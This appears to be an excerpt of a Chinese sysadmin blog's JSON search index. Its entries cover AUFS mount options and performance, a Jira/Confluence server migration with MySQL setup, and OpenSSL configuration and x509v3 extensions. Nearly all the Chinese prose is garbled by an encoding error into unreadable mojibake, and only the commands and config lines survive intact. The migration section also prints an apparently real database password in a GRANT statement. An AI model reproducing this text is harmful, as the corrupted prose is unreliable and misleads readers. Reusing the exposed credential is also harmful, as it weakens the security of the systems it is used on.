ä¸ºé‚£äº›ä¸åœ¨mountç›®å½•é‡Œå‘ç”Ÿçš„ä¿®æ”¹ï¼Œaufsä¸ä¼šåŒæ­¥è¿‡æ¥äº†ï¼Œæ‰€ä»¥ä¼šæœ‰æ•°æ®å‡ºé”™çš„é—®é¢˜ã€‚ udba=reval â€“ è®¾ç½®ä¸Šè¿™ä¸ªå‚æ•°åï¼ŒAUFSä¼šå»æŸ¥æ–‡ä»¶æœ‰æ²¡æœ‰è¢«æ›´æ–°ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±ä¼šæŠŠä¿®æ”¹æ‹‰åˆ°mountç›®å½•å†…ã€‚ udba=notify â€“ è¿™ä¸ªå‚æ•°ä¼šè®©AUFSä¸ºæ‰€æœ‰çš„branchæ³¨å†Œinotifyï¼Œè¿™æ ·å¯ä»¥è®©AUFSåœ¨æ›´æ–°æ–‡ä»¶ä¿®æ”¹çš„æ€§èƒ½æ›´é«˜ä¸€äº›ã€‚ ","date":"2021-05-31 14:50","objectID":"/post/2418/:3:1","tags":["docker"],"title":"DOCKERåŸºç¡€æŠ€æœ¯ï¼šAUFS(è½¬)","uri":"/post/2418/"},{"categories":["å…¶ä»–"],"content":"å…¶äºŒã€å¦‚æœæœ‰å¤šä¸ªrwçš„branchï¼ˆç›®å½•ï¼‰è¢«unionèµ·æ¥äº†ï¼Œé‚£ä¹ˆï¼Œå½“æˆ‘åˆ›å»ºæ–‡ä»¶çš„æ—¶å€™ï¼Œaufsä¼šåˆ›å»ºåœ¨å“ªé‡Œå‘¢ï¼Ÿ aufsæä¾›äº†ä¸€ä¸ªå«createçš„å‚æ•°å¯ä»¥ä¾›ä½ æ¥é…ç½®ç›¸å½“çš„åˆ›å»ºç­–ç•¥ï¼Œä¸‹é¢æœ‰å‡ ä¸ªä¾‹å­ã€‚ create=rr | roundâˆ’robin è½®è¯¢ã€‚ä¸‹é¢çš„ç¤ºä¾‹å¯ä»¥çœ‹åˆ°ï¼Œæ–°åˆ›å»ºçš„æ–‡ä»¶è½®æµå†™åˆ°ä¸‰ä¸ªç›®å½•ä¸­ hchen$ sudo mount -t aufs -o dirs=./1=rw:./2=rw:./3=rw -o create=rr none ./mnt hchen$ touch ./mnt/a ./mnt/b ./mnt/c hchen$ tree . â”œâ”€â”€ 1 â”‚ â””â”€â”€ a â”œâ”€â”€ 2 â”‚ â””â”€â”€ c â””â”€â”€ 3 â””â”€â”€ b create=mfs[:second] | mostâˆ’freeâˆ’space[:second] é€‰ä¸€ä¸ªå¯ç”¨ç©ºé—´æœ€å¥½çš„åˆ†æ”¯ã€‚å¯ä»¥æŒ‡å®šä¸€ä¸ªæ£€æŸ¥å¯ç”¨ç£ç›˜ç©ºé—´çš„æ—¶é—´ã€‚ create=mfsrr:low[:second] é€‰ä¸€ä¸ªç©ºé—´å¤§äºlowçš„branchï¼Œå¦‚æœç©ºé—´å°äºlowäº†ï¼Œé‚£ä¹ˆaufsä¼šä½¿ç”¨ round-robin æ–¹å¼ã€‚ æ›´å¤šçš„å…³äºAUFSçš„ç»†èŠ‚ä½¿ç”¨å‚æ•°ï¼Œå¤§å®¶å¯ä»¥ç›´æ¥åœ¨Ubuntu 14.04ä¸‹é€šè¿‡ man aufs æ¥çœ‹ä¸€ä¸‹å…¶ä¸­çš„å„ç§å‚æ•°å’Œå‘½ä»¤ã€‚ ","date":"2021-05-31 14:50","objectID":"/post/2418/:3:2","tags":["docker"],"title":"DOCKERåŸºç¡€æŠ€æœ¯ï¼šAUFS(è½¬)","uri":"/post/2418/"},{"categories":["å…¶ä»–"],"content":"AUFSçš„æ€§èƒ½ AUFSçš„æ€§èƒ½æ…¢å—ï¼Ÿä¹Ÿæ…¢ä¹Ÿä¸æ…¢ã€‚å› ä¸ºAUFSä¼šæŠŠæ‰€æœ‰çš„åˆ†æ”¯mountèµ·æ¥ï¼Œæ‰€ä»¥ï¼Œåœ¨æŸ¥æ‰¾æ–‡ä»¶ä¸Šæ˜¯æ¯”è¾ƒæ…¢äº†ã€‚å› ä¸ºå®ƒè¦éå†æ‰€æœ‰çš„branchã€‚æ˜¯ä¸ªO(n)çš„ç®—æ³•ï¼ˆå¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªç®—æ³•æœ‰å¾ˆå¤§çš„æ”¹è¿›ç©ºé—´çš„ï¼‰æ‰€ä»¥ï¼Œbranchè¶Šå¤šï¼ŒæŸ¥æ‰¾æ–‡ä»¶çš„æ€§èƒ½ä¹Ÿå°±è¶Šæ…¢ã€‚ä½†æ˜¯ï¼Œä¸€æ—¦AUFSæ‰¾åˆ°äº†è¿™ä¸ªæ–‡ä»¶çš„inodeï¼Œé‚£åä»¥åçš„è¯»å†™å’Œæ“ä½œåŸæ–‡ä»¶åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ã€‚ æ‰€ä»¥ï¼Œå¦‚æœä½ çš„ç¨‹åºè·‘åœ¨åœ¨AUFSä¸‹ï¼Œopenå’Œstatæ“ä½œä¼šæœ‰æ˜æ˜¾çš„æ€§èƒ½ä¸‹é™ï¼Œbranchè¶Šå¤šï¼Œæ€§èƒ½è¶Šå·®ï¼Œä½†æ˜¯åœ¨write/readæ“ä½œä¸Šï¼Œæ€§èƒ½æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ã€‚ IBMçš„ç ”ç©¶ä¸­å¿ƒå¯¹Dockerçš„æ€§èƒ½ç»™äº†ä¸€ä»½éå¸¸ä¸é”™çš„æ€§èƒ½æŠ¥å‘Šï¼ˆPDFï¼‰ã€ŠAn Updated Performance Comparison of Virtual Machinesand Linux Containersã€‹ æˆ‘æˆªäº†ä¸¤å¼ å›¾å‡ºæ¥ï¼Œç¬¬ä¸€å¼ æ˜¯é¡ºåºè¯»å†™ï¼Œç¬¬äºŒå¼ æ˜¯éšæœºè¯»å†™ã€‚åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆæ€§èƒ½æŸå¤±çš„é—®é¢˜ã€‚è€ŒKVMåœ¨éšæœºè¯»å†™çš„æƒ…å†µä¹Ÿå°±æœ‰ç‚¹æ…¢äº†ï¼ˆä½†æ˜¯ï¼Œå¦‚æœç¡¬ç›˜æ˜¯SSDçš„å‘¢ï¼Ÿï¼‰ 20660-44jefr87f1m.png 18324-26iv6mrrvw8.png ","date":"2021-05-31 14:50","objectID":"/post/2418/:4:0","tags":["docker"],"title":"DOCKERåŸºç¡€æŠ€æœ¯ï¼šAUFS(è½¬)","uri":"/post/2418/"},{"categories":["å…¶ä»–"],"content":"1.å‡†å¤‡åŸºç¡€ç¯å¢ƒ mkdir /application mkdir /server/packages -p mkdir /data å®‰è£…javaç¯å¢ƒ jdk-8u221-linux-x64.tar.gz tar xfÂ jdk-8u221-linux-x64.tar.gz -C /application/jdk å®‰è£…mysql5.7.20ï¼š mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz tar xfÂ mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz -C /application/mysql useradd mysql -M -s /sbin/nologin mkdir -p /data/mysql chown -R mysql.mysql /application/mysql chown -R mysql.mysql /data/mysql yum install -y libaio-devel yum remove mariadb-libs mysqld â€“initialize-insecure â€“user=mysql â€“basedir=/application/mysql â€“datadir=/data/mysql cp /application/mysql/support-files/mysql.server /etc/init.d/mysqld vim /etc/my.cnf ä¿®æ”¹é…ç½®æ–‡ä»¶ [mysqld] basedir=/application/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=2 port=3306 log-error=/data/mysql/mysql.log max_allowed_packet = 256M transaction-isolation=READ-COMMITTED character_set_server=utf8mb4 innodb_default_row_format=DYNAMIC default-storage-engine=INNODB innodb_large_prefix=ON innodb_file_format=Barracuda innodb_log_file_size=2G [mysql] socket=/tmp/mysql.sock prompt=maiunsoft-db-[\\d]\u003e default-character-set=utf8 å¯åŠ¨æœåŠ¡ /etc/init.d/mysqld start é…ç½®ç¯å¢ƒå˜é‡ echo â€˜PATH=$PATH:/application/jdk/bin/:/application/mysql/binâ€™ Â» /etc/profile source /etc/profile 2.å®‰è£…jira_confluence 2.1å®‰è£…tomcat tar xf jira-tomcat.tar.gz -C /application/jira tar xf confluence-tomcat.tar.gzÂ -C /application/confluence 2.2è¿˜åŸæ•°æ® tar xfÂ jira-data.tar.gz -C /data/Jira tar xf confluence-data.tar.gzz -C /data/confluence 3.æ¢å¤mysql 3.1åˆ›å»ºåº“ CREATE DATABASE jira CHARACTER SET utf8mb4 COLLATE utf8mb4_bin; CREATE DATABASE confluence CHARACTER SET utf8 COLLATE utf8_bin; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,REFERENCES,ALTER,INDEX on jira.* TO â€˜jiraâ€™@â€™localhostâ€™ IDENTIFIED BY â€˜7a15vuLai$â€™; GRANT all on confluence.* TO â€˜jiraâ€™@â€™localhostâ€™ ; flush privileges; mysql -uroot -p jiraÂ \u003c xxx.sql mysql -uroot -p confluence \u003c xxx.sql 4.å¯åŠ¨é…ç½®Jira 4.1è®¾ç½®ç›®å‰æƒé™åˆ›å»ºç”¨æˆ· useradd jira chown -R jira.jira /application/jira/ chown -R jira.jira /data/jira/ useradd confluence chown -R confluence.confluence /application/confluence chown -R confluence.confluence /data/confluence/ 4.2ä¿®æ”¹æ•°æ®åº“è¿æ¥,å¯åŠ¨æœåŠ¡ vim /data/jira/dbconfig.xml /application/jira/bin/start-jira.sh vim /data/confluuence/confluence.cfg.xml å°†ç”¨æˆ·æ”¹æˆconfluence vim /application/confluence/bin/user.sh å¯åŠ¨æœåŠ¡ sh /application/confluence/bin/start-confluence.sh ","date":"2021-05-21 10:23","objectID":"/post/2415/:0:0","tags":["confluence"],"title":"jira_confluenceå…¨é‡è¿ç§»","uri":"/post/2415/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"###å®˜æ–¹æ–‡æ¡£: è¯ä¹¦æ‰©å±•rfc 5280: https://datatracker.ietf.org/doc/html/rfc5280#section-4.2 openssl: https://www.openssl.org/docs/man1.0.2/man5/x509v3_config.html ###ä¸‹é¢ä»‹ç»å‡ ä¸ªæ‰©å±•é¡¹ 1.basicConstraints ç”¨äºç¡®å®šè¯ä¹¦æ˜¯å¦å¯ä»¥ç»™å…¶ä»–äººé¢å‘è¯ä¹¦,å†™æ³•å¦‚ä¸‹ basicConstraints=CA:TRUE # å¯ä»¥é¢å‘ basicConstraints=CA:FALSE # ä¸å¯ä»¥é¢å‘ basicConstraints=critical,CA:TRUE, pathlen:0 # å°†æ­¤æ‰©å±•é¡¹è®¾ç½®ä¸ºcritical(å…³é”®),CA:TRUEè¡¨ç¤ºå…è®¸ç»™å…¶ä»–äººç­¾å‘è¯ä¹¦,pathlen:0è¡¨ç¤ºè¿™ä¸ªè¯ä¹¦ä¸‹å¯ä»¥æœ‰å¤šå°‘ä¸ªCAæœºæ„ï¼Œ0ä»£è¡¨æ²¡æœ‰,å³åªèƒ½é¢å‘æœ€ç»ˆå®ä½“è¯ä¹¦ ** criticalè¯´æ˜: ** å¦‚æœé‡åˆ°æ— æ³•è¯†åˆ«çš„å…³é”®æ‰©å±•æˆ–åŒ…å«æ— æ³•å¤„ç†çš„ä¿¡æ¯çš„å…³é”®æ‰©å±•ï¼Œåˆ™ä½¿ç”¨è¯ä¹¦çš„ç³»ç»Ÿå¿…é¡»æ‹’ç»è¯¥è¯ä¹¦ã€‚ 2.Key Usage æŒ‡å®šè¯ä¹¦ä¸­åŒ…å«çš„å¯†é’¥ç”¨é€”(ä¾‹å¦‚ï¼ŒåŠ å¯†ã€ç­¾åã€è¯ä¹¦ç­¾å)ã€‚å¯é€‰é¡¹: digitalSignature, nonRepudiation(ä»¥åå¯èƒ½ä¼šå«contentCommitment), keyEncipherment, dataEncipherment, keyAgreement, keyCertSign, cRLSign, encipherOnly, decipherOnly keyUsage=critical,digitalSignature,keyEncipherment # è®¾ç½®ä¸ºå…³é”®æ‰©å±•é¡¹,ä½¿ç”¨å…¬é’¥è¿›è¡Œæ•°å­—ç­¾åå’Œå¯†é’¥åŠ å¯†,ä¸€èˆ¬çš„httpséƒ½æ˜¯è¿™æ ·çš„é…ç½® 3.Extended Key Usage æŒ‡å®šä½¿ç”¨è¯ä¹¦å…¬é’¥çš„ç›®çš„ã€‚ serverAuth: SSL/TLS Web Server Authentication # æœåŠ¡ç«¯è®¤è¯ clientAuth: SSL/TLS Web Client Authentication # å®¢æˆ·ç«¯è®¤è¯ codeSigning: Code signing # ä»£ç ç­¾å emailProtection: E-mail Protection (S/MIME) # é‚®ä»¶ä¿æŠ¤ timeStamping: Trusted Timestamping # å¯ä¿¡æ—¶é—´æˆ³ OCSPSigning: OCSP Signing # OCSPç­¾å extendedKeyUsage = serverAuth, clientAuth # ä½œä¸ºæœåŠ¡ç«¯è®¤è¯å’Œå®¢æˆ·ç«¯è®¤è¯ä½¿ç”¨ 4.Subject Key Identifier å½“å‰è¯ä¹¦çš„å¯†é’¥æ ‡è¯†ç¬¦(SKID) subjectKeyIdentifier = hash # è‡ªåŠ¨è·å–å½“å‰è¯ä¹¦hashå€¼ 5.Authority Key Identifier å½“å‰è¯ä¹¦é¢å‘è€…çš„è¯ä¹¦çš„å¯†é’¥æ ‡è¯†ç¬¦ã€‚ keyid: å°è¯•è®¡ç®—å…¬é’¥å“ˆå¸Œå€¼(å¦‚æœè¯ä¹¦æ˜¯è‡ªç­¾åçš„)ã€‚æˆ–è€…ä»é¢å‘è€…è¯ä¹¦å¤åˆ¶ä¸»é¢˜å¯†é’¥æ ‡è¯†ç¬¦(SKID)ã€‚å¦‚æœå¤±è´¥ï¼Œå¹¶ä¸”æŒ‡å®šäº†â€™alwaysâ€™é€‰é¡¹ï¼Œåˆ™è¿”å›ä¸€ä¸ªé”™è¯¯ã€‚ issuer: å¦‚æœæŒ‡å®šâ€™alwaysâ€™é€‰é¡¹ï¼Œæˆ–è€…ä¸å­˜åœ¨å¯†é’¥æ ‡è¯†(keyid)ï¼Œé‚£ä¹ˆå°†ä»åˆ¶é¢å‘è¯ä¹¦ä¸­å¤åˆ¶\"DN\"å’Œåºåˆ—å·ã€‚ ä¸Šé¢å±äºå¼ºè¡Œè§£é‡Šï¼Œæˆ‘ä¹Ÿä¸å¤ªç†è§£ã€‚ authorityKeyIdentifier = keyid, issuer authorityKeyIdentifier = keyid, issuer:always 6.Subject Alternative Name ä¸»é¢˜å¤‡ç”¨åç§° # email:copyï¼Œä»DNä¸­å¤åˆ¶ã€‚ subjectAltName = email:copy, email:my@example.com, URI:http://my.example.com/ # ipv4 subjectAltName = IP:192.168.7.1 # ipv6 subjectAltName = IP:13::17 subjectAltName = email:my@example.com, RID:1.2.3.4 subjectAltName = otherName:1.2.3.4;UTF8:some other identifier [extensions] subjectAltName = dirName:dir_sect [dir_sect] C = UK O = My Organization OU = My Unit CN = My Name æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™çš„å‘½ä»¤å’Œé…ç½®: openssl ca -in soulchild.com.csr -extfile ext.cnf ext.cnfå†…å®¹: subjectAltName=critical,DNS.1:it.soulchild.com,IP.1:127.0.0.1,email:copy,dirName:dir_sect extendedKeyUsage=serverAuth keyUsage=critical,digitalSignature,keyEncipherment subjectKeyIdentifier=hash authorityKeyIdentifier=keyid:always,issuer [dir_sect] C = UK O = My Organization OU = My Unit CN = My Name ","date":"2021-05-19 10:28","objectID":"/post/2410/:0:0","tags":["ssl","tls","openssl"],"title":"openssl-x509v3_configé…ç½®æ–‡ä»¶å­¦ä¹ ","uri":"/post/2410/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å‚è€ƒæ–‡æ¡£: 1.0.2ç‰ˆæœ¬: https://www.openssl.org/docs/man1.0.2/ 1.1.1ç‰ˆæœ¬: https://www.openssl.org/docs/man1.1.1/ https://jianiau.blogspot.com/2015/07/openssl-generate-csr.html ä¹¦ç±: OpenSSLä¸ç½‘ç»œä¿¡æ¯å®‰å…¨-åŸºç¡€ã€ç»“æ„å’ŒæŒ‡ä»¤ oidæŸ¥è¯¢å·¥å…·: http://www.oid-info.com/ ","date":"2021-05-18 10:42","objectID":"/post/2402/:0:0","tags":["openssl"],"title":"openssl-é…ç½®æ–‡ä»¶å­¦ä¹ ","uri":"/post/2402/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€é…ç½®æ–‡ä»¶æè¿°: opensslçš„è®¸å¤šç›¸å…³åº”ç”¨ç¨‹åºï¼Œä½¿ç”¨é…ç½®æ–‡ä»¶æ¥è·å–é»˜è®¤çš„é…ç½®é¡¹.é…ç½®æ–‡ä»¶è·¯å¾„/etc/pki/tls/openssl.cnf. é…ç½®æ–‡ä»¶ç”±è‹¥å¹²ä¸ª[ section_name ]ç»„æˆï¼Œé…ç½®æ–‡ä»¶çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯ç‰¹æ®Šçš„ï¼Œç§°ä¸ºé»˜è®¤éƒ¨åˆ†ã€‚è¯¥éƒ¨åˆ†æ˜¯æœªå‘½åçš„ï¼ŒèŒƒå›´ä»æ–‡ä»¶çš„ç¬¬ä¸€è¡Œä¸€ç›´åˆ°ç¬¬ä¸€ä¸ª[ section_name ]ã€‚åœ¨æŸ¥æ‰¾é…ç½®é¡¹æ—¶ï¼Œé¦–å…ˆåœ¨[ section_name ]éƒ¨åˆ†ä¸­æŸ¥æ‰¾ï¼Œç„¶åå†åˆ°é»˜è®¤éƒ¨åˆ†ä¸­æŸ¥æ‰¾ã€‚ éƒ¨åˆ†å­å‘½ä»¤ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„sectioné…ç½®ï¼Œæ¯”å¦‚openssl reqå¯¹åº”[ req ],openssl caå¯¹åº”[ ca ],å…·ä½“å†…å®¹å¯èƒ½æ˜¯å¼•ç”¨å…¶ä»–section æ¯ä¸ª[ section_name ]ä¸‹ä¼šæœ‰è‹¥å¹²ä¸ªé…ç½®é¡¹ï¼Œå®ƒä»¬ä»¥name=valueçš„å½¢å¼å‡ºç°ï¼Œnameè¿˜å¯ä»¥ä½œä¸ºå˜é‡ä½¿ç”¨,ä½¿ç”¨æ ¼å¼$varor${var},ä½†è¿™ä»…é™äºå†æœ¬sectionä¸­ä½¿ç”¨ã€‚å¦‚æœè¦å¼•ç”¨å…¶ä»–sectionä¸­çš„å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨$section::name or ${section::name}ã€‚$ENV::nameå¯ä»¥å¼•ç”¨ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œå¦‚æœç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­ä¸å­˜åœ¨ä¼šå¼•ç”¨é»˜è®¤éƒ¨åˆ†çš„å˜é‡ã€‚ nameçš„valueè¿˜å¯ä»¥æŒ‡å‘[ section_name ]ã€‚ ä¸‹é¢æ˜¯ä¸ªé…ç½®æ–‡ä»¶ç¤ºä¾‹: # è¿™é‡Œæ˜¯é»˜è®¤éƒ¨åˆ† HOME = . RANDFILE = $ENV::HOME/.rnd oid_section = new_oids # è¿™ä¸ªæ˜¯è‡ªå®šä¹‰oidçš„é…ç½®(ä¸ªäººç†è§£) # è¿™æ˜¯ä¸€ä¸ªsection [ new_oids ] tsa_policy1 = 1.2.3.4.1 tsa_policy2 = 1.2.3.4.5.6 tsa_policy3 = 1.2.3.4.5.7 # è¿™æ˜¯ä¸€ä¸ªsection [ ca ] default_ca = CA_default # æŒ‡å‘`[ CA_default ]`è¿™ä¸ªsection # è¿™æ˜¯ä¸€ä¸ªsection [ CA_default ] dir = /etc/pki/CA certs = $dir/certs # ä½¿ç”¨$dirå¼•ç”¨ä¸Šé¢dirå®šä¹‰çš„å€¼ ","date":"2021-05-18 10:42","objectID":"/post/2402/:0:1","tags":["openssl"],"title":"openssl-é…ç½®æ–‡ä»¶å­¦ä¹ ","uri":"/post/2402/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€è¯ä¹¦è¯·æ±‚(openssl req)ç›¸å…³é…ç½® ä¸‹é¢æ˜¯openssl reqçš„éƒ¨åˆ†é»˜è®¤é…ç½®,å‘½ä»¤è¡Œçš„å‚æ•°ä¼˜å…ˆçº§é«˜äºé…ç½®æ–‡ä»¶ã€‚reqé…ç½®è¯¦ç»†å¸®åŠ©å¯æŸ¥çœ‹manæ‰‹å†Œman req [ req ] default_bits = 2048 # ç”Ÿæˆçš„å¯†é’¥é•¿åº¦ï¼Œå¯¹åº”å‚æ•°-newkey rsa:nbits default_md = sha256 # æ•£åˆ—ç®—æ³•,å¯¹åº”å‚æ•°-sha256 default_keyfile = privkey.pem # é»˜è®¤çš„ç§é’¥æ–‡ä»¶å,å¯¹åº”å‚æ•°-keyout # prompt = yes # æ˜¯å¦æç¤ºè¾“å…¥(äº¤äº’å¼) distinguished_name = req_distinguished_name # ä½¿ç”¨reqå‘½ä»¤è¿›è¡Œè¯ä¹¦ç­¾åè¯·æ±‚(csr)æ—¶ï¼Œäº¤äº’æé—®çš„å†…å®¹å’Œé»˜è®¤å€¼ã€‚å¯ä»¥å°†é»˜è®¤æ˜¯è®¾æˆä»ç¯å¢ƒå˜é‡è·å–ã€‚ç¼–å†™æ ¼å¼å–å†³äºpromptçš„å€¼æ˜¯yesè¿˜æ˜¯noã€‚manæ‰‹å†Œ'DISTINGUISHED NAME AND ATTRIBUTE SECTION FORMAT'éƒ¨åˆ† attributes = req_attributes # ä½¿ç”¨æ–¹æ³•å’Œdistinguished_nameä¸€æ ·ï¼Œä»‹ç»æš‚æ—¶å¿½ç•¥ x509_extensions = v3_ca # è¯¥å­—æ®µå®šä¹‰äº†ä¸€ç³»åˆ—è¦åŠ å…¥åˆ°è¯ä¹¦ä¸­çš„æ‰©å±•é¡¹(ä»…é’ˆå¯¹è‡ªç­¾åè¯ä¹¦) # è¿™ä¸ªé»˜è®¤æ˜¯æ³¨é‡Šçš„ï¼Œä»£è¡¨ç§é’¥å¯†ç  # input_password = secret # è¯»å–ç§é’¥æ—¶çš„å¯†ç  # output_password = secret # åˆ›å»ºç§é’¥æ—¶è®¾ç½®çš„å¯†ç  string_mask = utf8only # è¯ä¹¦è¯·æ±‚çš„ä¿¡æ¯å­—æ®µçš„å­—ç¬¦ä¸²ç±»å‹,ä¸€èˆ¬é»˜è®¤å³å¯ # req_extensions = v3_req # è¦æ·»åŠ åˆ°è¯ä¹¦è¯·æ±‚ä¸­çš„æ‰©å±•é¡¹ ... è¯ä¹¦æ‰©å±•é¡¹é…ç½®åœ¨åé¢çš„x509v3_configä¸­ä»‹ç» ","date":"2021-05-18 10:42","objectID":"/post/2402/:0:2","tags":["openssl"],"title":"openssl-é…ç½®æ–‡ä»¶å­¦ä¹ ","uri":"/post/2402/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€caè¯ä¹¦é¢å‘(openssl ca)ç›¸å…³é…ç½® caæ˜¯å¼•ç”¨äº†CA_defaultçš„ä¿¡æ¯ï¼Œä¸»è¦åŒ…æ‹¬ CAæŒ‡ä»¤é…ç½®æ–‡ä»¶è·¯å¾„ã€ CAç­¾å‘è¯ä¹¦çš„é™åˆ¶å’Œç­–ç•¥ï¼Œä»¥åŠæŒ‡å®šCAæ‰©å±•é¡¹å­—æ®µã€‚ä¸‹é¢æ˜¯é»˜è®¤çš„é…ç½®æ–‡ä»¶ä¸­æ‘˜å‡ºæ¥çš„å†…å®¹ï¼Œå®Œæ•´å†…å®¹å¯ä»¥æŸ¥çœ‹man ca,åœ¨â€™CONFIGURATION FILE OPTIONSâ€™éƒ¨åˆ† [ ca ] default_ca = CA_default # å¼•ç”¨[ CA_default ] #################################################################### [ CA_default ] dir = /etc/pki/CA # é»˜è®¤å­˜åœ¨,CAç®¡ç†çš„ç›¸å…³æ–‡ä»¶éƒ½æ”¾åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œ certs = $dir/certs # é»˜è®¤å­˜åœ¨,å¯ä»¥å°†è¯ä¹¦ä¿å­˜åˆ°è¿™ä¸ªç›®å½•ï¼Œä¾¿äºè‡ªå·±ç®¡ç†(éå¿…é¡») crl_dir = $dir/crl # è¯ä¹¦åŠé”€åˆ—è¡¨çš„ç›®å½•ï¼Œä½œç”¨ç±»ä¼¼ä¸Šé¢çš„ database = $dir/index.txt # ç´¢å¼•æ•°æ®åº“æ–‡ä»¶,è®°å½•äº†æ‰€æœ‰ä»¥é¢å‘æˆ–åŠé”€çš„è¯ä¹¦ä¿¡æ¯ã€‚é¦–æ¬¡é…ç½®éœ€è¦touchåˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶ #unique_subject = no # æ˜¯å¦ä¿è¯ç­¾å‘çš„è¯ä¹¦subjectå”¯ä¸€ï¼Œé»˜è®¤yesï¼Œå³subjectå®Œå…¨ç›¸åŒçš„csrä¼šç­¾å‘å¤±è´¥ new_certs_dir = $dir/newcerts # openssl caå‘½ä»¤ç­¾å‘çš„è¯ä¹¦é»˜è®¤å­˜æ”¾è·¯å¾„ certificate = $dir/cacert.pem # CAè¯ä¹¦æ–‡ä»¶è·¯å¾„ serial = $dir/serial # ç­¾å‘è¯ä¹¦æ—¶ä½¿ç”¨çš„åºåˆ—å·,å†…å®¹æ˜¯16è¿›åˆ¶æ ¼å¼ã€‚é¦–æ¬¡é…ç½®éœ€è¦åˆ›å»ºå¹¶æ·»åŠ å†…å®¹00æˆ–å…¶ä»–å¯ç”¨åºåˆ—å·åˆ°æ–‡ä»¶ crlnumber = $dir/crlnumber # åŠé”€è¯ä¹¦æ—¶ä½¿ç”¨çš„åºåˆ—å·,å†…å®¹æ˜¯16è¿›åˆ¶æ ¼å¼ã€‚é¦–æ¬¡é…ç½®éœ€è¦åˆ›å»ºå¹¶æ·»åŠ å†…å®¹00æˆ–å…¶ä»–å¯ç”¨åºåˆ—å·åˆ°æ–‡ä»¶ crl = $dir/crl.pem # è¯ä¹¦åŠé”€åˆ—è¡¨æ–‡ä»¶. private_key = $dir/private/cakey.pem# CAçš„ç§é’¥ RANDFILE = $dir/private/.rand # éšæœºæ•°ç§å­æ–‡ä»¶,ç”¨äºç”Ÿæˆå¯†é’¥ x509_extensions = usr_cert # ç­¾å‘è¯ä¹¦æ—¶é™„åŠ çš„æ‰©å±•é¡¹,å¦‚æœæ²¡æœ‰æ‰©å±•éƒ¨åˆ†ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªV1è¯ä¹¦ã€‚å¦‚æœæ‰©å±•éƒ¨åˆ†å­˜åœ¨(å³ä½¿å®ƒæ˜¯ç©ºçš„)ï¼Œåˆ™ç”ŸæˆV3ç‰ˆæœ¬çš„è¯ä¹¦ã€‚å¯¹åº”å‚æ•°-extensions # ç­¾å‘è¯ä¹¦çš„æ—¶å€™ä¼šæ˜¾ç¤ºcsrçš„ä¿¡æ¯ï¼Œä¸‹é¢çš„é…ç½®å†³å®šæ˜¾ç¤ºçš„æ ¼å¼,å¯ç”¨é€‰é¡¹åœ¨man x509ä¸­NAME OPTIONSæˆ–Name Optionséƒ¨åˆ†æŸ¥çœ‹ name_opt = ca_default # Subject Name options cert_opt = ca_default # Certificate field options # å°†csrè¯·æ±‚ä¸­åŒ…å«çš„æ‰©å±•æƒ³å¤åˆ¶åˆ°ç­¾å‘çš„è¯ä¹¦ä¸­ã€‚ä¸‰ä¸ªå¯é€‰é¡¹ # é»˜è®¤noneå¿½ç•¥æ‰€æœ‰,ä¸å¤åˆ¶ã€‚ # copy: ä»…å¤åˆ¶csrè¯·æ±‚çš„æ‰©å±•é¡¹ä¸­æˆ‘ä»¬æ²¡æœ‰å®šä¹‰çš„æ‰©å±•é¡¹(é…ç½®æ–‡ä»¶ä¸­x509_extensionséƒ¨åˆ†æ˜¯æˆ‘ä»¬å®šä¹‰çš„) # copyall: å¤åˆ¶csrè¯·æ±‚çš„æ‰€æœ‰æ‰©å±•é¡¹ï¼Œå°†ä¼šè¦†ç›–æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„æ‰©å±•é¡¹ # copy_extensions = copy # ç”Ÿæˆè¯ä¹¦åŠé”€åˆ—è¡¨(crl)æ—¶åŠ å…¥çš„æ‰©å±•é¡¹,å¦‚æœæ²¡æœ‰æä¾›æ‰©å±•é¡¹,é‚£ä¹ˆç”Ÿæˆçš„CRLå°±æ˜¯v1ç‰ˆæœ¬çš„ # crl_extensions = crl_ext default_days = 365 # é»˜è®¤ç­¾å‘è¯ä¹¦çš„æœ‰æ•ˆæœŸ,å¯¹åº”å‚æ•°-days default_crl_days= 30 # è·ç¦»ä¸‹æ¬¡è¯ä¹¦åŠé”€åˆ—è¡¨(crl)å‘å¸ƒçš„æ—¶é—´é—´éš”ï¼Œå•ä½å¤© # default_crl_hours=24 # è·ç¦»ä¸‹æ¬¡è¯ä¹¦åŠé”€åˆ—è¡¨(crl)å‘å¸ƒçš„æ—¶é—´é—´éš”ï¼Œå•ä½å°æ—¶ default_md = sha256 # è¯ä¹¦ç­¾åä½¿ç”¨çš„æ•£åˆ—ç®—æ³• preserve = no # è®¾ç½®DNçš„æ˜¾ç¤ºé¡ºåº,é»˜è®¤æ˜¯æ ¹æ®ä¸‹é¢çš„policyåŒ¹é…ç­–ç•¥å†³å®šçš„,å¦‚æœè®¾ç½®ä¸ºyes,å°†æ ¹æ®csrè¯·æ±‚çš„ä¿æŒä¸€è‡´ã€‚(DNå°±æ˜¯Distinguished Name,ä½¿ç”¨openssl x509 -text -nooutæŸ¥çœ‹è¯ä¹¦ä¸­çš„Issuerå’ŒSubjectå°±æ˜¯DNä¿¡æ¯) # 